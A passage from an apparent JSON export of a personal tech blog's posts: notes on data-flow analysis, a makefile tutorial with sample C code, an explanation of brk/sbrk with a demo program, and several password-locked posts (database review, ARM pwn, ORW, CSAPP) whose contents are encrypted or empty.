src=\"/2021/05/03/static-program/image-20210316132843680.png\" alt=\"image-20210316132843680\"></p>\n<h3 id=\"Example\"><a href=\"#Example\" class=\"headerlink\" title=\"Example\"></a>Example</h3><p><img src=\"/2021/05/03/static-program/image-20210316133326936.png\" alt=\"image-20210316133326936\"></p>\n<h1 id=\"0x03Data-Flow-Analysis-Applications\"><a href=\"#0x03Data-Flow-Analysis-Applications\" class=\"headerlink\" title=\"0x03Data Flow Analysis-Applications\"></a>0x03Data Flow Analysis-Applications</h1><h2 id=\"1-Overview\"><a href=\"#1-Overview\" class=\"headerlink\" title=\"1.Overview\"></a>1.Overview</h2><p><img src=\"/2021/05/03/static-program/image-20210316162556579.png\" alt=\"image-20210316162556579\"></p>\n<p><img src=\"/2021/05/03/static-program/image-20210316163402058.png\" alt=\"image-20210316163402058\"></p>\n<h3 id=\"Transfer-Function\"><a href=\"#Transfer-Function\" class=\"headerlink\" title=\"Transfer Function\"></a>Transfer Function</h3><ul>\n<li>forward</li>\n<li>backward</li>\n</ul>\n<p><img src=\"/2021/05/03/static-program/image-20210316164525008.png\" alt=\"image-20210316164525008\"></p>\n<h3 id=\"Control-Flow\"><a href=\"#Control-Flow\" class=\"headerlink\" title=\"Control Flow\"></a>Control Flow</h3><p><img src=\"/2021/05/03/static-program/image-20210316165009528.png\" alt=\"image-20210316165009528\"></p>\n<h2 id=\"2-Reaching-Definitions-Analysis\"><a href=\"#2-Reaching-Definitions-Analysis\" class=\"headerlink\" title=\"2. Reaching Definitions Analysis\"></a>2. Reaching Definitions Analysis</h2><h3 id=\"definition\"><a href=\"#definition\" class=\"headerlink\" title=\"definition\"></a>definition</h3><p><img src=\"/2021/05/03/static-program/image-20210316165640682.png\" alt=\"image-20210316165640682\"></p>\n<h3 id=\"understanding\"><a href=\"#understanding\" class=\"headerlink\" title=\"understanding\"></a>understanding</h3><p>Focus on definition</p>\n<p>transfer Function</p>\n<ul>\n<li>generate a definition</li>\n<li>kill other definition</li>\n</ul>\n<p>control flow</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316171733031.png\" alt=\"image-20210316171733031\"></p>\n<p><strong>eg</strong></p>\n<p><img src=\"/2021/05/03/static-program/image-20210316172331897.png\" alt=\"image-20210316172331897\"></p>\n<h3 id=\"algorithm\"><a href=\"#algorithm\" class=\"headerlink\" title=\"algorithm\"></a>algorithm</h3><p>这里有两个点需要看一下</p>\n<ol>\n<li>为什么OUT[entry]=空？因为入口处并未定义。此外，为什么不把OUT[entry]放入for循环中？因为要有一个模板生成算法</li>\n<li>下面这个while中for循环的停止条件在哪里？</li>\n</ol>\n<p><img src=\"/2021/05/03/static-program/image-20210316172851109.png\" alt=\"image-20210316172851109\"></p>\n<p><strong>eg</strong></p>\n<p>how  CFG transfer to SourceCode？</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316173536011.png\" alt=\"image-20210316173536011\"></p>\n<p>next,we will see the changes on the OUT[].</p>\n<p>we should focus on two points</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IN[B] &#x3D; union(p a predecessor of B OUT[P]);</span><br><span class=\"line\">OUT[B] &#x3D; genB(IN[B]-killB);</span><br></pre></td></tr></table></figure>\n<p>until no changes occur on OUT</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316223814163.png\" alt=\"image-20210316223814163\"></p>\n<p>There are two sentences.</p>\n<p>This is very important</p>\n<p>In each data-flow analysis application, we associate with every program point a <strong>data-flow value</strong> that represents an <strong>abstraction</strong> of the set of all possible <strong>program states</strong> that can be observed for the point.</p>\n<p>Data-flow analysis is to <strong>find a solution</strong> to a set of <strong>safe-approximation</strong> directed constraints on the IN’s and OUT’s,for all statements.</p>\n<p>And why this algorithm can stop?</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316225904275.png\" alt=\"image-20210316225904275\"></p>\n<h2 id=\"3-Live-Variables-Analysis\"><a href=\"#3-Live-Variables-Analysis\" class=\"headerlink\" title=\"3. Live Variables Analysis\"></a>3. Live Variables Analysis</h2><h3 id=\"definition-1\"><a href=\"#definition-1\" class=\"headerlink\" title=\"definition\"></a>definition</h3><p><img src=\"/2021/05/03/static-program/image-20210316230830828.png\" alt=\"image-20210316230830828\"></p>\n<h3 id=\"understanding-1\"><a href=\"#understanding-1\" class=\"headerlink\" title=\"understanding\"></a>understanding</h3><p>Focus on variables</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316231409321.png\" alt=\"image-20210316231409321\"></p>\n<p><img src=\"/2021/05/03/static-program/image-20210317170644795.png\" alt=\"image-20210317170644795\"></p>\n<h3 id=\"algorithm-1\"><a href=\"#algorithm-1\" class=\"headerlink\" title=\"algorithm\"></a>algorithm</h3><p><img src=\"/2021/05/03/static-program/image-20210317171158537.png\" alt=\"image-20210317171158537\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IN[B] &#x3D; useB union (OUT[B]-defB)</span><br><span class=\"line\">OUT[B] &#x3D; union s a successor of B IN[S]</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/05/03/static-program/image-20210317173026174.png\" alt=\"image-20210317173026174\"></p>\n<h2 id=\"4-Available-Expressions-Analysis\"><a href=\"#4-Available-Expressions-Analysis\" class=\"headerlink\" title=\"4. Available Expressions Analysis\"></a>4. Available Expressions Analysis</h2><h3 id=\"definition-2\"><a href=\"#definition-2\" class=\"headerlink\" title=\"definition\"></a>definition</h3><p><img src=\"/2021/05/03/static-program/image-20210317173623458.png\" alt=\"image-20210317173623458\"></p>\n<h3 id=\"understanding-2\"><a href=\"#understanding-2\" class=\"headerlink\" title=\"understanding\"></a>understanding</h3><p>Focus on expressions</p>\n<p><img src=\"/2021/05/03/static-program/image-20210317174047841.png\" alt=\"image-20210317174047841\"></p>\n<p><img src=\"/2021/05/03/static-program/image-20210317175430257.png\" alt=\"image-20210317175430257\"></p>\n<h3 id=\"algorithm-2\"><a href=\"#algorithm-2\" class=\"headerlink\" title=\"algorithm\"></a>algorithm</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OUT[B] &#x3D; genB union (IN[B]-killB)</span><br><span class=\"line\">IN[B] &#x3D; 交 P a predecessor of B OUT[P]</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/05/03/static-program/image-20210317194602113.png\" alt=\"image-20210317194602113\"></p>\n<h2 id=\"5-Analysis-Comparison\"><a href=\"#5-Analysis-Comparison\" class=\"headerlink\" title=\"5. Analysis Comparison\"></a>5. Analysis Comparison</h2><p><img src=\"/2021/05/03/static-program/image-20210317195618231.png\" alt=\"image-20210317195618231\"></p>\n<h1 id=\"0x04-Data-Flow-Analysis-Foundations\"><a href=\"#0x04-Data-Flow-Analysis-Foundations\" class=\"headerlink\" title=\"0x04 Data-Flow-Analysis Foundations\"></a>0x04 Data-Flow-Analysis Foundations</h1><h2 id=\"1-Iterative-Algorithm\"><a href=\"#1-Iterative-Algorithm\" class=\"headerlink\" title=\"1. Iterative Algorithm\"></a>1. Iterative Algorithm</h2><p><strong>why</strong></p>\n<p>This has a fixed point.</p>\n<p><img src=\"/2021/05/03/static-program/image-20210317202238222.png\" alt=\"image-20210317202238222\"></p>\n<h2 id=\"2-Partial-Order\"><a href=\"#2-Partial-Order\" class=\"headerlink\" title=\"2. Partial Order\"></a>2. Partial Order</h2><h2 id=\"3-Lattice\"><a href=\"#3-Lattice\" class=\"headerlink\" title=\"3. Lattice\"></a>3. Lattice</h2><h2 id=\"4-Data-Flow-Analysis-Framework-via-Lattice\"><a href=\"#4-Data-Flow-Analysis-Framework-via-Lattice\" class=\"headerlink\" title=\"4. Data Flow Analysis Framework via Lattice\"></a>4. Data Flow Analysis Framework via Lattice</h2><p><img src=\"/2021/05/03/static-program/image-20210317205624533.png\" alt=\"image-20210317205624533\"></p>\n<h2 id=\"5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem\"><a href=\"#5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem\" class=\"headerlink\" title=\"5. Relate Iterative Algorithm to Fixed-Point Theorem\"></a>5. Relate Iterative Algorithm to Fixed-Point Theorem</h2>","categories":[],"tags":["Course"]},{"title":"Database review","url":"https://pz1o.top/2021/05/03/Database-review/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\"> U2FsdGVkX19C+ut0lbZRmPlftMmoc8pQOu2RIwtgvAkjrEG/cmcsaVwIDACuHTYxzkzEZKyS3oVqXl61ZNjqtCRsfXWdwX1yiWi+Zh/+vbbQXpT0qeaM5Wa3oIXHJJXURIPo9ufNg1hpCJRorYBJN6Rvdj5Ejg1W/mzaIk+lXbOfEDqwF4Ih1jOSaZ2jZXLLTKgMKe09TaIw4vXd5qFxlgAh1NwEDJfb6laevYpgm9LD8PiPa+Je4ditdEsoejnBVW3ds8+mLFMYNw1qy8gScfmyzbkTPqi0p5l+xYEXP/+yDeHkvBocICWtemeo3hu8RAP+tVoBh+8ilhtRrJjxEmq8Rfp5mN8p0swOm11N8b3xE6Y3Y0TH/uc8SfJEia1JmcUbHpoFPmPyynQGOfHjDvYeLYME10hM+TW2wlQKj4K/yh2roVlSMnox+H6NeixmO7MnyOpraPuy9WwzlvtGN3J3IEZmdj3ZivjWYsh7C5kjlm01XIX+Llx4fUmiey89cQSbSOX91gR1KPD34NgJvdp17X/u8vuIJ4hrRnMue2jtaPYZBcyfOr/2tvBiMEl1T5bYst2Ii8ptMLYUY0dym9IP6dyKkEMvqjPiaWtrQDBDVu/rWdUVpuPw5rh45N4KeSmqWSfhBubuuWzSbcFT3fMhGytgBsjWxTGAI3Zt5i9HmpONPaXrg+ofV3wuF9wgdDfuUUtNpm4hp8tegmjO+5+VQuksU1VUteWAjuoQh6i/Zc1mZmRNtWtGpsDAUquTWiZ2YxmdocOxxcxR9hqFbFPV5d26WicL+4jknxZmR1eNejhqZKIM9bJRpolxVjMqnOnMlJ1OvqKrpY3dOg8D3n6b4qVRKW4gzjQDeA6Dy++1f9cvVK74abBpfcLfU2K364JB5yO8ey24yWBDILjLpsCIPjfZc6LhNRtMEDiuE9DAl6qbRr0KGDeRFx2w+SYs+mktds0LWeISYUsZQxBgYj0tdv3ZGldMFbD6jiXM6v1b86jC2ULxKPvkA0Tb9rdD9Qxxo2aGvF9Kj9/8ym/2gMAcGtCyqBCg5BiFoVLctfZrFEbGvY4CxKJr/Nm8R9ErKIW0sPoAeSZTOQxCn70MDFEkbvQG0Vgy6hN03QSJ6T8C3F+WhxxbstK+M6KZw41wV1MP5QrO6x0xqOJXGz32WeNONTLy9YPRkna/fDQbp2AqLMcI0cCVwvcJ6Ou/bz4HxjxGOOqxiCBaUlwWHrb7HIyLF5f4ittG3VsTkA+4PufZMoZKrsRsW6kEzniS+mhrR30jI4HMMmZPhh2IkJ47hJKV+jUz1pGZ4fl/HtmOJ3TToRoPzoeJ96GPJFbXwjxp7PmQTURkSOFPXd3LIrHVkKXKN3JTAyZOWHa+SnmLKtL/D8d8k2pPTl4Aw/OkiSl9Zeh8KoaWwPjOJuBIwubBZg== </div>","categories":[],"tags":["Course"]},{"title":"makefile","url":"https://pz1o.top/2021/04/30/makefile/","content":"<p>懒狗必备，makefile</p>\n<p>为什么要写makefile，因为懒</p>\n<h1 id=\"0x01-简单makefile编写\"><a href=\"#0x01-简单makefile编写\" class=\"headerlink\" title=\"0x01 简单makefile编写\"></a>0x01 简单makefile编写</h1><p><strong>makefile的基本格式</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target : dependency_files ##dependency_files是依赖的文件</span><br><span class=\"line\">\tcommand #注意是一个TAB</span><br><span class=\"line\">hello.o:hello.c hello.h</span><br><span class=\"line\">\tgcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure>\n<p>eg：</p>\n<p>这里有四个文件 <code>demo1.c</code> <code>demo2.c</code> <code>main.c</code> <code>head.h</code>四个文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//demo1.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">print1</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"this is demo1\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//demo2.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">print2</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"this is demo2\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//head.h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">print1</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">print2</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//main.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"head.h\"</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    print1();</span><br><span class=\"line\">    print2();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"it is end\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//makefile</span></span><br><span class=\"line\">demo:demo1.o demo2.o main.o</span><br><span class=\"line\">    gcc demo1.o demo2.o main.o -o demo</span><br><span class=\"line\">demo1.o:demo1.c</span><br><span class=\"line\">    gcc demo1.c -Wall -c -o demo1.o</span><br><span class=\"line\">demo2.o:demo2.c</span><br><span class=\"line\">    gcc demo2.c -Wall -c -o demo2.o</span><br><span class=\"line\">main.o:main.c</span><br><span class=\"line\">   gcc main.c -Wall -c -o main.o</span><br><span class=\"line\">clean:</span><br><span class=\"line\">\trm *.o demo</span><br><span class=\"line\">        </span><br><span class=\"line\">[<span class=\"number\">17</span>:<span class=\"number\">34</span>:<span class=\"number\">25</span>] pz1o:make_demo $ make      </span><br><span class=\"line\">gcc demo1.c -Wall -c -o demo1.o</span><br><span class=\"line\">gcc demo2.c -Wall -c -o demo2.o</span><br><span class=\"line\">gcc main.c -Wall -c -o main.o</span><br><span class=\"line\">gcc demo1.o demo2.o main.o -o demo</span><br><span class=\"line\">[<span class=\"number\">17</span>:<span class=\"number\">34</span>:<span class=\"number\">28</span>] pz1o:make_demo $ ./demo </span><br><span class=\"line\"><span class=\"keyword\">this</span> is demo1</span><br><span class=\"line\"><span class=\"keyword\">this</span> is demo2</span><br><span class=\"line\">it is <span class=\"built_in\">end</span>%</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-变量\"><a href=\"#0x02-变量\" class=\"headerlink\" title=\"0x02 变量\"></a>0x02 变量</h1><p>变量的命名字可以包含字符、数字，下划线（可以是数字开头），但不应该含有“:”、“#”、“=”或是空字符（空格、回车等）。变量是区分英文字母大小写的。</p>\n<p>预定义变量</p>\n<ul>\n<li>AR    库文件维护程序名称，默认为ar.AS汇编程序名称，默认值为as。</li>\n<li>CC    C编译器的名称，默认为cc。CPP C预编译器的名称，默认值为$(CC) -E</li>\n<li>CXX    C++编译器的名称，默认为g++</li>\n<li>FC    FORTRAN编译器的缩写，默认值为f77</li>\n<li>RM    文件删除程序名称，默认为rm -f</li>\n</ul>\n<p>自动变量</p>\n<p>变量名    变量含义</p>\n<ul>\n<li>$*    不包含扩展名的目标文件名称</li>\n<li>$+    所有的依赖文件，以空格分开，并以出现后的先后为序，可能包含重复依赖文件</li>\n<li>$&lt;    第一个依赖文件的名称</li>\n<li>$?    所有时间戳比目标文件晚的依赖文件，并以空格分开目标文件的完整名称</li>\n<li>$@    目标文件的完整名称</li>\n<li>$^    所有不重复的目标依赖文件，以空格分开</li>\n<li>$%    如果目标是归档成员，则该变量表示目标的归档成员的目标名称</li>\n</ul>\n<p>makefile编写</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GCCFLAGS=-c -Wall</span><br><span class=\"line\">OBJS=demo1.o demo2.o main.o</span><br><span class=\"line\"><span class=\"section\">demo:<span class=\"variable\">$(OBJS)</span></span></span><br><span class=\"line\">        gcc  <span class=\"variable\">$^</span> -o <span class=\"variable\">$@</span></span><br><span class=\"line\"><span class=\"section\">demo2.o:demo2.c</span></span><br><span class=\"line\">        gcc <span class=\"variable\">$(GCCFLAGS)</span> <span class=\"variable\">$&lt;</span> -o <span class=\"variable\">$@</span></span><br><span class=\"line\"><span class=\"section\">demo1.o:demo1.c</span></span><br><span class=\"line\">        gcc <span class=\"variable\">$(GCCFLAGS)</span> <span class=\"variable\">$&lt;</span> -o <span class=\"variable\">$@</span></span><br><span class=\"line\"><span class=\"section\">main.o:main.c</span></span><br><span class=\"line\">        gcc <span class=\"variable\">$(GCCFLAGS)</span> <span class=\"variable\">$&lt;</span> -o <span class=\"variable\">$@</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">.PHONY</span>:clean</span></span><br><span class=\"line\"><span class=\"section\">clean:</span></span><br><span class=\"line\">        rm *.o demo</span><br></pre></td></tr></table></figure>\n<p>改进版的makefile</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GCCFLAGS=-c -Wall</span><br><span class=\"line\">OBJS=demo1.o demo2.o main.o</span><br><span class=\"line\">TARGET=./demo</span><br><span class=\"line\"><span class=\"section\">%.o:%.c</span></span><br><span class=\"line\">        <span class=\"variable\">$(CC)</span> <span class=\"variable\">$(GCCFLAGS)</span> -c <span class=\"variable\">$&lt;</span> -o <span class=\"variable\">$@</span></span><br><span class=\"line\"><span class=\"variable\">$(TARGET)</span>:<span class=\"variable\">$(OBJS)</span></span><br><span class=\"line\">        <span class=\"variable\">$(CC)</span>  <span class=\"variable\">$^</span> -o <span class=\"variable\">$@</span></span><br><span class=\"line\"><span class=\"section\">clean:</span></span><br><span class=\"line\">        <span class=\"variable\">$(RM)</span> *.o demo</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["c"]},{"title":"ARM-pwn","url":"https://pz1o.top/2021/04/29/arm-pwn/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\">  </div>","categories":[],"tags":["PWN"]},{"title":"ORW","url":"https://pz1o.top/2021/04/28/ORW/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\">  </div>","categories":[],"tags":["PWN"]},{"title":"csapp","url":"https://pz1o.top/2021/04/18/csapp/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\">  </div>","categories":[],"tags":["book"]},{"title":"理解sbrk和brk","url":"https://pz1o.top/2021/04/17/理解sbrk和brk/","content":"<h1 id=\"0x01-sbrk和brk函数原型\"><a href=\"#0x01-sbrk和brk函数原型\" class=\"headerlink\" title=\"0x01 sbrk和brk函数原型\"></a>0x01 sbrk和brk函数原型</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">brk</span><span class=\"params\">(<span class=\"keyword\">void</span> *addr)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> *<span class=\"title\">sbrk</span><span class=\"params\">(<span class=\"keyword\">intptr_t</span> increment)</span></span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>description:        </p>\n<p>brk() and sbrk() change the location of the program break, which defines the end of the process’s data segment (i.e., the program break is the first location after the end of the uninitialized data segment).  Increasing the program break has the effect of allocating memory to the process; decreasing the break deallocates memory.</p>\n<p>return value:</p>\n<p>On success, brk() returns zero.  On error, -1 is returned, and errno is set to ENOMEM.</p>\n<p>On success, sbrk() returns the previous program break.  (If the break was increased, then this value is a pointer to the start of the newly allocated memory).  On error, (void *) -1 is returned,and errno is set to ENOMEM.</p>\n</blockquote>\n<p>英文解释的很清楚了，主要理解什么是program break和data segment</p>\n<ol>\n<li>program break被定义为程序data segment的结束位置</li>\n<li>data segment应该包含了data segment、bss segment和heap</li>\n</ol>\n<p>此外，我们还需要关注两个函数的返回值</p>\n<ol>\n<li>brk通过传递的addr来重新设置program break，成功则返回0，否则返回-1</li>\n<li>sbrk用来增加heap，增加的大小通过参数increment决定，返回增加大小前的heap的program break，如果increment为0则返回program break。</li>\n</ol>\n<h1 id=\"0x02-演示\"><a href=\"#0x02-演示\" class=\"headerlink\" title=\"0x02 演示\"></a>0x02 演示</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> bss_end;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">void</span>* ret;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"bss is %p\\n\"</span>,(<span class=\"keyword\">char</span>*)(&amp;bss_end)+<span class=\"number\">4</span>);</span><br><span class=\"line\">\tret = sbrk(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ret != (<span class=\"keyword\">void</span>*)<span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"start %p\\n\"</span>,ret);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ASLR开启结果如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o$ ./a</span><br><span class=\"line\">bss is 0x601048</span><br><span class=\"line\">start 0x1056000</span><br><span class=\"line\"> ~/Desktop/mydemo [04:52:59]</span><br><span class=\"line\">pz1o$ ./a</span><br><span class=\"line\">bss is 0x601048</span><br><span class=\"line\">start 0xd28000</span><br><span class=\"line\"> ~/Desktop/mydemo [04:52:59]</span><br><span class=\"line\">pz1o$ 